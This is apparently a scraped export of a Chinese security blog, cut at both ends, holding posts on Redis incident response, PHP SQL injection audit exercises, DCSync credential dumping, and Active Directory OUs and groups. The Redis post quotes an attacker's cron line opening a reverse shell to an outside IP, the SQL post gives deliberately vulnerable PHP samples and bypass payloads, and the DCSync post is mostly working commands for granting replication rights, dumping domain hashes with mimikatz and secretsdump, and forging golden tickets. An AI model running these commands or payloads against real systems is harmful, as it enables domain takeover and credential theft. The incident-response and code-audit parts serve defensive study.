&quot;dir&quot;202) &quot;/root&quot; 此时继续排查还可以通过如下命令去查看攻击者加载了哪些恶意模块 12345678910// 默认情况下的所有模块及其相关信息127.0.0.1:6379&gt; MODULE LIST(empty list or set)// 遭受攻击后的所有模块及其相关信息127.0.0.1:6379&gt; MODULE LIST1) 1) &quot;name&quot; 2) &quot;system&quot; // 此时已加载system模块，可以通过system进行命令执行，判断为恶意模块 3) &quot;ver&quot; 4) (integer) 1 此时若需要进行应急处置，则可以去到对应文件目录下将恶意文件删除，将恶意模块卸载，将目录及持久化文件更改为默认即可 123456127.0.0.1:6379&gt; module unload systemOK127.0.0.1:6379&gt; config set dir redis的工作目录OK127.0.0.1:6379&gt; config set dbfilename dump.rdbOK 定时任务排查12345678910111213// 默认情况下的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;dump.rdb&quot;201) &quot;dir&quot;202) &quot;/root&quot;// 写入计划任务的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;root&quot;201) &quot;dir&quot;202) &quot;/var/spool/cron&quot; 当发现存在恶意脚本后，发现其存在Redis版本信息，不像正常的定时脚本任务 12345678[root@VM-8-10-centos ~]# crontab -lREDIS0009� redis-ver5.0.13��edis-bits�@�ctime��9fused-mem�8 aof-preamble���xxx&lt;*/1 * * * * bash -i &gt;&amp; /dev/tcp/152.136.43.227/56789 0&gt;&amp;1[root@VM-8-10-centos ~]# rm -rf /var/spool/cron/root 恢复Redis正常的配置内容 1234127.0.0.1:6379&gt; config set dir redis的工作目录OK127.0.0.1:6379&gt; config set dbfilename dump.rdbOK Webshell排查排查Web目录，需自行维护规则，现排查PHP中包含eval、exec、system、shell_exec、popen、passthre命令 1find ./ -type f -name &quot;*.php&quot; | xargs grep -E &quot;eval\\(|exec\\(|system\\(|shell_exec\\(|popen\\(|passthru\\(&quot; | more 排查方法 12345// 查找1天以内被访问过的文件find /opt -iname &quot;*&quot; -atime 1 -type f// 查找最近一天被修改的网站文件，例如 php 网站find -mtime -1 -type f -name *.php SSH公钥排查若攻击者未做痕迹清理则是如下的状态信息 12345678910111213// 默认情况下的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;dump.rdb&quot;201) &quot;dir&quot;202) &quot;/root&quot;// 写入SSH公钥的配置文件127.0.0.1:6379&gt; CONFIG GET * 1) &quot;dbfilename&quot; 2) &quot;authorized_keys&quot;201) &quot;dir&quot;202) &quot;/root/.ssh&quot; 查看&#x2F;root&#x2F;.ssh&#x2F;authorized_keys文件中是否存在未知的公钥 1234567��H7���[root@VM-8-10-centos ~]# cat /root/.ssh/authorized_keysREDIS0009� redis-ver5.0.13��edis-bits�@�ctime���9fused-mem�@Y aof-preamble���xB.ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8ivgS86gwNoMkBxxYOs96jL2ulsc1mXV4CzR9NKFF6ywWcLoMQiIRzRArHTcNebEZ5A+a899Ob5ag0VkH9ZB5amkUx8WwJA2L6zI2gQ07eoAdX83II5SSr6BTsLZ2GI0ZCSpZOKjszqmwaMARs9bh9Y3qZ2Q9VP2Hs+DvAtuubKmB0j9ABz85erK9vVaEDyqxdYLraEqeEH1f7I8y5+a/mhKKw7QqX4LBcyz7rwEIIEJAuhaDcnOYN5jLqOJcrmEEXPmkuMiIBZ8F/1YLoFAQoyt8d5ri0/QcwjBQI8vaCOuWZgmSIbFTCqGVeQmzj/0AYco0+fd/3tqKQHEJQ7a9A4jD2n/6hoOUz/M/kib62ISikrSRrMDT4B1bEn5i1ZAFcaHJIfxro8SfRxOUtrPV2IzyEL/5uQdMg2PfqCvfiW1wwPx/0ltwSTOVvoNpIUjRm2Ptz/Oksg3uD8990R737pqMuTUNqcEW060FMlK0V9U4/leoniFS9QwnRvYi8XU= 可看到文件内存在Redis版本号信息，可以将该用户公钥直接删除，同时恢复Redis的默认配置 1234127.0.0.1:6379&gt; config set dir redis的工作目录OK127.0.0.1:6379&gt; config set dbfilename dump.rdbOK Lua沙箱逃逸并非 Redis 本身漏洞，形成原因在于系统补丁加载了一些redis源码注释了的代码，所以 Redis 层面是不存在日志的 这种情况只能排查系统日志了 1234567891011// 排查系统消息日志tail -n 100 /var/log/messages// 排查系统日志tail -n 100 /var/log/syslog// 认证和授权相关日志tail -n 100 /var/log/auth.log// 安全日志tail -n 100 /var/log/secure","categories":[{"name":"Emergency response","slug":"Emergency-response","permalink":"http://example.com/categories/Emergency-response/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}]},{"title":"PHP Code Audit-SQL Injection","slug":"PHP-Code-Audit-SQL-Injection","date":"2023-11-28T08:18:05.000Z","updated":"2024-06-28T08:20:22.513Z","comments":true,"path":"2023/11/28/PHP-Code-Audit-SQL-Injection/","permalink":"http://example.com/2023/11/28/PHP-Code-Audit-SQL-Injection/","excerpt":"","text":"SQL注入漏洞常见过滤方法 intval(PHP 4, PHP 5, PHP 7, PHP 8)：将用户传入的数据只保留数字，其余字符以及字母全部过滤掉。 123456789101112131415161718192021222324&lt;?php echo intval(123abc); // 123 echo intval(42); // 42 echo intval(4.2); // 4 echo intval(&#x27;42&#x27;); // 42 echo intval(&#x27;+42&#x27;); // 42 echo intval(&#x27;-42&#x27;); // -42 echo intval(042); // 34 echo intval(&#x27;042&#x27;); // 42 echo intval(1e10); // 10000000000 echo intval(&#x27;1e10&#x27;); // 10000000000 echo intval(0x1A); // 26 echo intval(&#x27;0x1A&#x27;); // 0 echo intval(&#x27;0x1A&#x27;, 0); // 26 echo intval(42000000); // 42000000 echo intval(420000000000000000000); // -4275113695319687168 echo intval(&#x27;420000000000000000000&#x27;); // 9223372036854775807 echo intval(42, 8); // 42 echo intval(&#x27;42&#x27;, 8); // 34 echo intval(array()); // 0 echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;)); // 1 echo intval(false); // 0 echo intval(true); // 1?&gt; addslashes(PHP 4, PHP 5, PHP 7, PHP 8)：将字符&#39;、&quot;、\\、NUL以反斜线转义，过滤SQL注入 123456&lt;?php echo addslashes(&#x27;); // \\&#x27; echo addslashes(&quot;); // \\&quot; echo addslashes(\\); // \\\\ echo addslashes(NUL); // 未知，但也被转义?&gt; mysql_real_escape_string(PHP 4 &gt;&#x3D; 4.3.0, PHP 5,本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除)：将字符串中的&#39;、&quot;、\\、NUL以反斜线转义，以在 SQL 语句中使用 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php// 假设你已经连接到数据库$connection = mysql_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);mysql_select_db(&quot;example&quot;, $connection);// 获取用户输入$order = $_GET[&#x27;order&#x27;];// 使用 mysql_real_escape_string 处理用户输入$escapedUserInput = mysql_real_escape_string($order);echo $escapedUserInput;echo &quot;&lt;/br&gt;&quot;;// 构造 SQL 查询$query = &quot;SELECT name, age, email, country FROM user_details ORDER BY id &#123;$escapedUserInput&#125;;&quot;;// 执行查询$result = mysql_query($query);// 检查查询是否成功if (!$result) &#123; die(&#x27;Query failed: &#x27; . mysql_error());&#125;// 处理查询结果...while ($row = mysql_fetch_assoc($result)) &#123; echo $row[&#x27;email&#x27;] . &quot;&lt;br&gt;&quot;;&#125;// 关闭数据库连接mysql_close($connection);?&gt;输出：和addslashes函数处理过的结果一致 mysqli_escape_string &#x2F; mysqli_real_escape_string &#x2F; mysqli::escape_string(PHP 5, PHP 7, PHP 8)：将字符&#39;、&quot;、\\、NUL以反斜线转义，过滤SQL注入 PDO::quote(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8, PECL pdo &gt;&#x3D; 0.2.1)：为 SQL 查询里的字符串添加引号，返回加引号的字符串 1234567891011121314&lt;?php$conn = new PDO(&#x27;sqlite:/home/lynn/music.sql3&#x27;);/* 危险字符串 */$string = &#x27;Naughty \\&#x27; string&#x27;;print &quot;Unquoted string: $string\\n&quot;;print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;\\n&quot;;?&gt;打印结果：Unquoted string: Naughty &#x27; stringQuoted string: &#x27;Naughty &#x27;&#x27; string&#x27; 参数化查询：暂未了解 常见过滤绕过方法 intval addslashes &#x2F; mysql_real_escape 宽字节注入 寻找字符串转换函数 urldecode base64_decode iconv json_decode stripshasles simple_xml_loadstring mysqli::escape_string &#x2F; PDO::quote 与addslashes差别：是否会主动加引号包裹 宽字符注入 参数化查询 寻找非SQL值位置 SELECT &#39;name&#39; FROM &#39;users&#39; WHERE &#39;id&#39; = ? ORDER BY &#39;login_time&#39; LIMIT 1 开发者容易遗漏的输入点 HTTP头 X-Forwarded-For User-Agent Referer PHP_SELF REQUEST_URI 文件名$_FILES[][name] php:&#x2F;&#x2F;input 引入单引号（转义符的方法） stripslashes base64_decode urldecode substr iconv str_replace(‘0’,”,$sql) xml json_encode SQL注入代码审计练习数据库创建语句1234567891011121314151617-- 创建数据库CREATE DATABASE example;-- 创建表格CREATE TABLE `example`.`user_details` ( `id` INT NOT NULL AUTO_INCREMENT, `name` VARCHAR(256) NOT NULL, `email` VARCHAR(256) NOT NULL, `age` INT NULL, `country` VARCHAR(128) NULL, PRIMARY KEY (`id`)) ENGINE = MyISAM;-- 插入数据INSERT INTO user_details (id, name, email, age, country) VALUES (&#x27;1&#x27;, &#x27;Bob&#x27;, &#x27;bob@example.com&#x27;, &#x27;22&#x27;, &#x27;China&#x27;);INSERT INTO user_details (id, name, email, age, country) VALUES (&#x27;2&#x27;, &#x27;Zhang&#x27;, &#x27;zhang@example.com&#x27;, &#x27;25&#x27;, NULL); common.php12345678910111213141516&lt;?phptry &#123; $dbhost = &quot;localhost&quot;; $dbname = &#x27;example&#x27;; $dbuser = &#x27;root&#x27;; $dbpass = &#x27;root&#x27;; $option = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION ]; $conn = new PDO(&quot;mysql:host=$dbhost;dbname=$dbname&quot;, $dbuser, $dbpass, $option);&#125; catch (PDOException $e) &#123; echo &quot;Error：&quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;; die();&#125;?&gt; SQL注入代码审计-112345678910111213141516171819&lt;?phpinclude_once &#x27;./common.php&#x27;;highlight_file(__FILE__);try &#123; $name = $_GET[&#x27;name&#x27;]; $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = &#x27;&#123;$name&#125;&#x27;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在很明显的SQL注入漏洞，对用户传入的参数没有进行过滤直接拼接到SQL语句中 SQL注入代码审计-212345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $name = addslashes($_GET[&#x27;name&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = &#x27;&#123;$name&#125;&#x27;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中不存在SQL注入漏洞，宽字节注入是针对GBK或者宽字节编码的才存在，在UTF-8下不存在 SQL注入代码审计-312345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $name = htmlspecialchars($_GET[&#x27;name&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = &#x27;&#123;$name&#125;&#x27;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，htmlspecialchars的作用是将特殊字符转换为 HTML 实体，是为了预防XSS漏洞，也可以转义单引号和双引号，但是需要在参数中设置，也就是更改如下所示： 1$name = htmlspecialchars($_GET[&#x27;name&#x27;],ENT_QUOTES); 常量名称 描述 ENT_COMPAT 会转换双引号，不转换单引号。 ENT_QUOTES 既转换双引号也转换单引号。 SQL注入代码审计-412345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $age = addslashes($_GET[&#x27;age&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE age &gt; &#123;$age&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，因为数值型SQL注入不需要使用单双引号来进行闭合，将数字型的值使用单引号包裹起来即可修复： 1$query = &quot;SELECT name, age, email, country FROM user_details WHERE age &gt; &#x27;&#123;$age&#125;&#x27;;&quot;; SQL注入代码审计-512345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $name = str_replace(&quot;&#x27;&quot;, &quot;\\\\&#x27;&quot;, $_GET[&#x27;name&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = &#x27;&#123;$name&#125;&#x27;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，str_replace函数是将指定的字符替换为另一个字符，在此处是将&#39;替换为\\\\&#39;，可以通过如下方式进行绕过： 1http://192.168.36.130:81/sql5.php?name=Zhang\\&#x27; SQL注入代码审计-612345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $id = intval($_GET[&#x27;id&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE id = &#123;$id&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中不存在SQL注入漏洞 SQL注入代码审计-712345678910111213141516171819&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $id = intval($_GET[&#x27;id&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE id = &#123;$_GET[&#x27;id&#x27;]&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，SQL语句没有使用转义后的$id，而是使用用户传入的原始参数 SQL注入代码审计-812345678910111213141516171819202122&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; if (!is_numeric($_GET[&#x27;id&#x27;]))&#123; header(&quot;Status: 404 Not found&quot;); &#125; $query = &quot;SELECT name, age, email, country FROM user_details WHERE id = &#123;$_GET[&#x27;id&#x27;]&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，因为只给了提示404，代码没有中止，还在继续向下运行。is_numeric：检测变量是否为数字或数字字符串，变量为数字或数字字符串则返回 true，否则返回 false。 SQL注入代码审计-91234567891011121314151617181920212223&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; if (!is_numeric($_GET[&#x27;id&#x27;]))&#123; header(&quot;Status: 404 Not found&quot;); exit; &#125; $query = &quot;SELECT name, age, email, country FROM user_details WHERE id = &#123;$_GET[&#x27;id&#x27;]&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中不存在SQL注入漏洞 SQL注入代码审计-10123456789101112131415161718192021&lt;?phpinclude_once &#x27;./common.php&#x27;;highlight_file(__FILE__);try &#123; $order = addslashes($_GET[&#x27;order&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details ORDER BY id &#123;$order&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞,只有有值的位置才可以通过addslashes进行过滤，在此处ORDER BY id 后面的位置没有值了，存在堆叠注入 SQL注入代码审计-1112345678910111213141516171819202122232425&lt;?phpinclude_once &#x27;./common.php&#x27;;highlight_file(__FILE__);try &#123; $order = addslashes($_GET[&#x27;order&#x27;]); if (!preg_match(&#x27;/DESC|ASC/i&#x27;, $order)) &#123; exit(&quot;Bad order&quot;); &#125; $query = &quot;SELECT name, age, email, country FROM user_details ORDER BY id &#123;$order&#125;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，其中检查了用户传入的值是否包含“DESC”或“ASC”，但是这里只是检测是否存在匹配的字符，没有判断是否一定只能存在“DESC”或“ASC”，没有做到严格限制，传入例如：union select 1,2,3# desc即可绕过了该检测，注意#号，在前端中是做定位符存在的，要将其url编码后发送。 1http://192.168.36.130:8080/11.php%3Forder%3Dunion%20select%201%2C2%2C3%23%20DESC 漏洞修复：增加首尾定界符，让其只能存在“DESC”或“ASC” 123if (!preg_match(&#x27;/^(DESC|ASC)$/i&#x27;, $order)) &#123; exit(&quot;Bad order&quot;); &#125; SQL注入代码审计-121234567891011121314151617181920&lt;?phpinclude_once &#x27;common.php&#x27;;highlight_file(__FILE__);try &#123; $name = addslashes($_GET[&#x27;name&#x27;]); $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = ?;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;bindValue(1, $name); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中不存在SQL注入漏洞，预编译的SQL语句 SQL注入代码审计-131234567891011121314151617181920&lt;?phpinclude_once &#x27;./common.php&#x27;;highlight_file(__FILE__);try &#123; $name = addslashes($_GET[&#x27;name&#x27;]); $name = urldecode($name); $query = &quot;SELECT name, age, email, country FROM user_details WHERE name = &#x27;&#123;$name&#125;&#x27;;&quot;; $stmt = $conn-&gt;prepare($query); $stmt-&gt;execute(); $stmt-&gt;bindColumn(&#x27;email&#x27;, $email); while ($row = $stmt-&gt;fetch(PDO::FETCH_BOUND)) &#123; echo &quot;$email&quot; . &quot;&lt;br&gt;&quot;; &#125;&#125; catch (PDOException $e) &#123; echo $e-&gt;getMessage();&#125;?&gt; 在上述代码中存在SQL注入漏洞，url编码payload即绕过了addslashes函数 1http://192.168.36.130:81/sql13.php?name=Zhang%2527","categories":[{"name":"Code Audit","slug":"Code-Audit","permalink":"http://example.com/categories/Code-Audit/"}],"tags":[{"name":"Code Audit","slug":"Code-Audit","permalink":"http://example.com/tags/Code-Audit/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"http://example.com/tags/SQL-Injection/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"DCSync","slug":"DCSync","date":"2023-04-01T07:54:44.000Z","updated":"2024-06-28T08:23:11.499Z","comments":true,"path":"2023/04/01/DCSync/","permalink":"http://example.com/2023/04/01/DCSync/","excerpt":"","text":"DCSync介绍 AD域渗透中常用的凭据窃取手段 在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。 DCSync攻击原理DCSync 的原理非常清晰，利用域控制器之间的数据同步复制。 发现网络中的目标域控制器; 通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol 在域内用户所具有的权限其实最根本是看用户的DACL，那么对于DCSync攻击来说，只要域用户拥有以下三条DACL即可向域控发出数据同步请求，从而dump去域内用户hash，这三条DACL分别为： 复制目录更改（DS-Replication-Get-Changes） 全部复制目录更改 (DS-Replication-Get-Changes-All ) 在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set） 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限： Administrators组内的用户 Domain Admins组内的用户 Enterprise Admins组内的用户 域控制器的计算机帐户 注意：DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。 DCSync能够做的事情给账户添加DCSync权限 12345# 首先导入 PowerView.ps1 脚本Import-Module .\\PowerView.ps1# 给指定的目标添加 DCSync 权限Add-DomainObjectAcl -TargetIdentity &quot;DC=xiaorang,DC=lab&quot; -PrincipalIdentity XIAORANG-EXC01$ -Rights DCSyncCopy to clipboardErrorCopied 利用DCSync导出域内哈希MimikatzMimikatz导出域内所有Hash，在获取权限的域成员主机上执行如下： 12345678910# 导出域内指定用户的信息(包括哈希值)lsadump::dcsync /domain:whoamianony.org /user:administrator lsadump::dcsync /domain:whoamianony.org /user:administrator /csv# 导出域内所有用户的信息(包括哈希值)lsadump::dcsync /domain:whoamianony.org /alllsadump::dcsync /domain:whoamianony.org /all /csv# 也可以使用下面mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;mimikatz.exe &quot;lsadump::dcsync /domain:whoamianony.org /all /csv&quot;Copy to clipboardErrorCopied MSF（Mimikatz）1234567# 导出域内所有用户的信息(包括哈希值)load kiwikiwi_cmd mimikatz.exe &quot;lsadump::dcsync /domain:XIAORANG.LAB /all /csv&quot; exit# 导出域内指定用户的信息(包括哈希值)load kiwikiwi_cmd mimikatz.exe &quot;lsadump::dcsync /domain:XIAORANG.LAB /user:administrator /csv&quot; exitCopy to clipboardErrorCopied Secretsdump.py项目地址：Github Impackt框架 Secretsdump.py 是 Impacket 框架中的一个脚本，该脚本也可以通过 DCSync 技术导出域控制器上用户的哈希。该工具的原理是首先使用提供的用户登录凭据通过 smbexec 或者 wmiexec 远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的哈希，同时通过 Dcsync 或从 NTDS.dit 文件中导出所有域用户的哈希。其最大的优点是支持从域外的计算机连接至域控制器。 123456# 获取 administrator 用户的哈希# python3 secretsdump.py domain/&lt;username for DCSync&gt;:password@&lt;dc-ip&gt; -dc-ip &lt;dc-ip&gt; -just-dc-user &lt;username for DCSync&gt;python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator# 获取所有域用户哈希, 包括机器用户python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30Copy to clipboardErrorCopied PowerShell项目地址：Invoke-ReflectivePEinjection 调用 mimikatz中的DCSync功能 该脚本可以通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 DCSync 功能 在获取权限的域成员主机上执行如下命令即可： 1234567Import-Module .\\Invoke-DCSync.ps1# 导出域内所有用户的哈希值Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize# 导出域内指定用户的哈希值Invoke-DCSync -DumpForest | ft -wrap -autosizeCopy to clipboardErrorCopied 利用 DCSync 制作黄金票据在域渗透中，我们可以通过 DCSync 导出域控制器中 krbtgt 账户的哈希，并利用 krbtgt 账户的哈希制作黄金票据。 krbtgt位域控制器的用户账户，是KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥。 123456789101112131415161718load kiwi# 使用 Mimikatz 的 DCSync 功能导出域控制器中 krbtgt 账户的哈希kiwi_cmd &quot;lsadump::dcsync /domain:whoamianony.org /user:krbtgt&quot;# 通过 krbtgt 账户的哈希生成黄金票据# -s：Object Security ID，后面的-三位数不需要# -k：NTML哈希golden_ticket_create -u Administrator -d whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142 -k 6be58bfcc0a164af2408d1d3bd313c2a -t gold.tck# 执行后生成的票据会咱是存放在你的 Kali 上，然后执行以下命令，清空目标主机上的票据kerberos_ticket_purge# 最后使用kerberos_ticket_use注入刚才生成的票据即可kerberos_ticket_use gold.tck# 可以访问域控任意资源了dir \\\\DC\\c$","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"DCSync","slug":"DCSync","permalink":"http://example.com/tags/DCSync/"}]},{"title":"Organizational unit","slug":"Organizational-unit","date":"2023-03-28T14:42:39.000Z","updated":"2024-06-28T08:23:18.133Z","comments":true,"path":"2023/03/28/Organizational-unit/","permalink":"http://example.com/2023/03/28/Organizational-unit/","excerpt":"","text":"当需要对用户赋予某特殊权限时，可以设置一个域用户组，对这个组配置资源访问权限，再将该用户拉进这个组，这样用户就拥有了这个组的权限。同样，如果需要对指定部门用户进行统一管理，便可以设置类似集合的概念，然后把该部门的用户拉入，这样就可以对该部门的用户集中进行管理了，这个集合就是组织单位。 组织单位（OU）是一个可以将域中的用户、组和计算机等对象放入其中的容器对象，是可以指派组策略或委派管理权限的最小作用域或单元。组织单位可以统一管理组织单位中的域对象。组织单位包括但不限于如下类型的对象：用户、计算机、工作组、打印机、安全策略，以及其他组织单位等。在组织域环境中，经常可以看到按照部门划分的一个个组织单位。 所有组织单位在活动目录中都是 organizationalUnit 类的示例，所以可以通过 (objectClass=organizationalUnit) 或者 （objectCategory=organizationalUnit） 查询所有的OU：Adfind.exe -b &quot;dc=hack-my,dc=com&quot; -f &quot;(objectClass=organizationalUnit)&quot; -dn 将BaseDN设置为指定的组织单元，便可以查询其中指定的对象。Adfind.exe -b &quot;OU=科研中心,DC=hack-my,DC=com&quot; -dn ，即可查询“科研中心”的对象","categories":[{"name":"Active directory pentesting","slug":"Active-directory-pentesting","permalink":"http://example.com/categories/Active-directory-pentesting/"}],"tags":[{"name":"OU","slug":"OU","permalink":"http://example.com/tags/OU/"}]},{"title":"Domain user group","slug":"Domain-user-group","date":"2023-03-27T14:42:39.000Z","updated":"2024-06-28T08:23:25.368Z","comments":true,"path":"2023/03/27/Domain-user-group/","permalink":"http://example.com/2023/03/27/Domain-user-group/","excerpt":"","text":"在域环境中，为方便对用户权限进行管理，需要将具有相同权限的用户划为一组。这样，只要对这个用户组赋予一定的权限，那么该组内的用户就获得了相同的权限 The purpose of user groups组（Group）是用户账号的集合，按照用途可以分为通讯组和安全组 通讯组就是一个通讯群组。例如，把某部门所有员工拉进同一个通讯组，当给这个通讯组发信息时，组内的所有用户都能收到。 安全组则是用户权限的集合。例如，管理员在日常的网络管理中，不必向每个用户账号都设置单独的访问权限，只需要创建一个组，再将需要该特权的用户拉进这个组即可。 Permissions of Security Groups 根据组的作用范围，安全组可以分为域本地组、通用组和全局组。注意，这里的作用范围指的是组在域树或域林中应用的范围 Domain local group域本地组作用于本域，主要用于访问同一个域中的资源。除了本组内的用户，域本地组还可以包含域林内的任何一个域和通用组、全局组的用户，但无法包含其他域中的域本地组。域本地组只能访问本域中的资源，无法访问其他不同域中的资源。管理员进行域组管理时，只能为域本地组授予本域的资源访问权限，无法授予对其他不同域中的资源访问权限。 当域林中多个域的用户想要访问一个域的资源时，可以从其他域向这个域的域本地组添加用户、通用组和全局组。 注意：域本地组在活动目录中都是 Group 类（ Group 